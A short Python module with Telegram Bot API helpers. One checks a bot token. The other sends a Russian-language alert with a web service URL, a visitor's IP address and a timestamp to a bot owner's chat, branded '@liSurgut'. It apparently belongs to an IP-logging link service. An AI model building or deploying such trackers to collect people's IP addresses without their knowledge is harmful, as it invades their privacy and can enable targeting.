import requests
import logging
from datetime import datetime


def get_bot_info(token):
    """
    Fetch bot information from Telegram API
    """
    try:
        response = requests.get(f'https://api.telegram.org/bot{token}/getMe')
        if response.status_code == 200:
            data = response.json()
            if data['ok']:
                return data['result']
        return None
    except Exception as e:
        logging.error(f"Error fetching bot info: {str(e)}")
        return None


def send_ip_notification(bot_token, telegram_id, ip_address, url):
    """
    Send notification to bot owner about new IP consent
    """
    try:
        message = f"🔔 Новый Ip\n\nВебсервис: {url}\nIP адресс: {ip_address}\nВремя: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n👤 all by @liSurgut"
        response = requests.get(
            f'https://api.telegram.org/bot{bot_token}/sendMessage',
            params={
                'chat_id': telegram_id,
                'text': message,
                'parse_mode': 'HTML'
            })
        return response.status_code == 200
    except Exception as e:
        logging.error(f"Error sending notification: {str(e)}")
        return False
